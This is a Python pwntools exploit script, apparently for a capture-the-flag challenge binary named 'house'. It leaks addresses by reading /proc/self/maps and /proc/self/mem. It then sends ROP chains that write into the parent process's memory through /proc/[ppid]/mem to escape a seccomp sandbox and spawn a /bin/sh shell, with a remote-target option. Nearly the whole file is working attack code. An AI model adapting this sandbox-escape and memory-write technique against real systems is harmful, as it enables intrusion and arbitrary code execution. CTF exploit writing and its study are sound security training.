#!/usr/bin/python

'''
Attention please, the target elf I test is not stripped.
'''
from pwn import *
import sys

debug = 1
libc = None
p = None

if debug:
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
	elf = ELF("./house")
	p = process("./house")
	#context.log_level = "debug"
else:
	libc = ELF("libc.so")
	#replace your target here
	p = remote('ip', 23333)

def find_something(p, something):
	p.recvuntil("Exit\n")
	p.sendline("1")
	p.recvuntil("what are you finding?\n")
	p.sendline(something)

def locate_yourself(p, location):
	p.recvuntil("Exit\n")
	p.sendline("2")
	p.recvuntil("Where are you?\n")
	p.sendline(str(location))

def get_something(p, count):
	p.recvuntil("Exit\n")
	p.sendline("3")
	p.recvuntil("How many things do you want to get?\n")
	p.sendline(str(count))

def give_something(p, content):
	p.recvuntil("Exit\n")
	p.sendline("4")
	p.recvuntil("content: \n")
	p.sendline(content)

def get_parent_pid(p):
	find_something(p, "/proc/self/status")
	locate_yourself(p, 0)
	get_something(p, 100)
	p.recvuntil("You get something:\n")
	data = p.recv(100)
	flag = 0

	for line in data.split("\n"):
		if "PPid" in line:
			ppid = int(line.split()[1], 10)
			print "\n[+] Got parent's pid: ", ppid
			flag = 1
			return ppid
	if flag == 0:
		print "[-] Can't get parent's pid"
		sys.exit()

def get_addresses(p):
	find_something(p, "/proc/self/maps")
	locate_yourself(p, 0)
	get_something(p, 3000)
	p.recvuntil("You get something:\n")
	data = p.recv(0x700)

	#the addresses we need
	parent_stack_addr = None
	elf_addr = None
	libc_addr = None
	mmap_addr = None

	'''
	we must find the mmap address, but in /proc/self/maps,
	we can't find the text 'mapped', so we assume the mmap 
	area is just behind the heap area.
	'''
	mem = data.split("\n")
	length = len(mem)
	for i in xrange(0, length):
		if "[stack]" in mem[i]:
			parent_stack_addr = int(mem[i].split("-")[0], 16)
			print "[+] parent stack address: " + hex(parent_stack_addr)

		#here, replace your path
		if "r-xp" in mem[i] and "/home/w0lfzhang/Desktop/seccomp/chuti/house" in mem[i]:
			elf_addr = int(mem[i].split("-")[0], 16)
			print "[+] ELF adderss: " + hex(elf_addr)

		if "r-xp" in mem[i] and "/lib/x86_64-linux-gnu/libc-2.23.so" in mem[i]:
			libc_addr = int(mem[i].split("-")[0], 16)
			print "[+] Libc adderss: " + hex(libc_addr)

		if "[heap]" in mem[i]:
			mmap_addr = int(mem[i+1].split("-")[0], 16)
			print "[+] mmap address: " + hex(mmap_addr)

	if None in (parent_stack_addr, elf_addr, libc_addr, mmap_addr):
		print "[-] Failed to find addresses from memory map. Exit...."
		sys.exit()

	return parent_stack_addr, elf_addr, libc_addr, mmap_addr

def get_child_stack_address(p):
	'''
	test on ubuntun 16.04.
	just dump the stack data and then find 
	the mmap_addr
	'''
	find_something(p, "/proc/self/mem")
	#see where your stack frame exactly is.
	locate_yourself(p, str(parent_stack_addr + 0x1f000))
	get_something(p, 8192+0x100)
	p.recvuntil("You get something:\n")

	child_stack_addr = None
	ret_from_waitpid = None
	offset = None
	mem = []

	for i in xrange(0, 8192, 8):
		#print i
		data = u64(p.recv(8))
		mem.append( (parent_stack_addr + 0x1f000 + i, data) )
		if data == mmap_addr:
			#print hex(data)
			break

	i = len(mem)
	print "[+] Find child stack address."
	offset = mem[i-2][1]
	print "[+] offset: " + hex(offset)
	ret_from_waitpid = mem[i-10][0]
	
	
	child_stack_addr = mmap_addr + offset
	print "[+] child stack address: " + hex(child_stack_addr)
	print "[+] ret_from_waitpid: " + hex(ret_from_waitpid)
	ret_from_read = child_stack_addr - (0x7fffe7efb3c0 - 0x7fffe7efb328)
	print "[+] ret_from_read: " + hex(ret_from_read)

	return child_stack_addr, ret_from_waitpid, ret_from_read

def dump_memory(p):
	'''
	if you don't get the libc,
	you must find a way to dump libc.
	'''
	pass

def exploit(p):
	#some gadgets
	pop_rdi = elf_addr + 0x1643
	pop_rsi_r15 = elf_addr + 0x1641
	pop_rdx = libc_addr + 0x1b92
	pop_rax = libc_addr + 0x33544
	#the function's addresses we need
	close_plt = elf_addr + elf.plt['close']
	#print "close: " + hex(close_plt)
	read_plt = elf_addr + elf.plt['read']
	open_plt = elf_addr + elf.plt['open']
	lseek_plt = elf_addr + elf.plt['lseek']
	write_plt = elf_addr + elf.plt['write']
	exit_plt = elf_addr + elf.plt['exit']
	#just test my rop chain
	binsh_addr = libc_addr + next(libc.search("/bin/sh"))
	puts_addr = libc_addr + libc.symbols['puts']
	syscall = libc_addr + 0xF722E
	#puts("/bin/sh")
	#rop_chain = p64(pop_rdi) + p64(binsh_addr) + p64(puts_addr)
	workspace = child_stack_addr - 0x8000
	#close(2) close fd 2
	rop_chain = p64(pop_rdi) + p64(2) + p64(close_plt)
	#read(0, workspace, 16) read filename
	#0x7fffe868e5c0
	rop_chain += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(workspace) *2 
	rop_chain += p64(pop_rdx) + p64(16) + p64(read_plt)
	#open("/proc/[ppid]/mem", 2)
	rop_chain += p64(pop_rdi) + p64(workspace) + p64(pop_rsi_r15) 
	rop_chain += p64(2) * 2 + p64(open_plt)
	#read(0, workspace + 0x1000, 0x100)
	rop_chain += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(workspace + 0x1000)*2
	rop_chain += p64(pop_rdx) + p64(0x100) + p64(read_plt)

	#lseek(2, ret_from_waitpid, 0)
	rop_chain += p64(pop_rdi) + p64(2) + p64(pop_rsi_r15) + p64(ret_from_waitpid) * 2 
	rop_chain += p64(pop_rdx) + p64(0) + p64(lseek_plt)
	#write(2, ret_from_waitpid+0x1000, 0x100)
	rop_chain += p64(pop_rdi) + p64(2) + p64(pop_rsi_r15) + p64(workspace + 0x1000) * 2
	rop_chain += p64(pop_rdx) + p64(0x100) + p64(write_plt)
	
	#exit(0)
	rop_chain += p64(pop_rdi) + p64(0) + p64(exit_plt)

	payload = 'combine.c'.ljust(24, '\x00') + p64(ret_from_read)
	find_something(p, payload)
	raw_input("go")
	give_something(p, rop_chain)
	print "[.] Sending the first rop chain...\n"
	#print p.recvuntil("/bin/sh")
	#7fffe86145a8
	p.send("/proc/%d/mem\x00" % ppid)
 
	rop_chain2 = p64(pop_rax) + p64(520)
	rop_chain2 += p64(pop_rdi) + p64(binsh_addr) + p64(pop_rsi_r15) + p64(0) *2 
	rop_chain2 += p64(pop_rdx) + p64(0) + p64(syscall)
	p.sendline(rop_chain2)


	p.interactive()

p.recvuntil("Do you want to help me build my room? Y/n?\n")
p.sendline("y")

ppid = get_parent_pid(p)
print "[+] Stage 1 finished!\n"

parent_stack_addr, elf_addr, libc_addr, mmap_addr = get_addresses(p)
print "[+] Stage 2 finished!\n"

child_stack_addr, ret_from_waitpid, ret_from_read = get_child_stack_address(p)
print "[+] Stage 3 finished!\n"

exploit(p)
print "[+] Stage 4 finished!\n"
print "[+] Exploit success!"


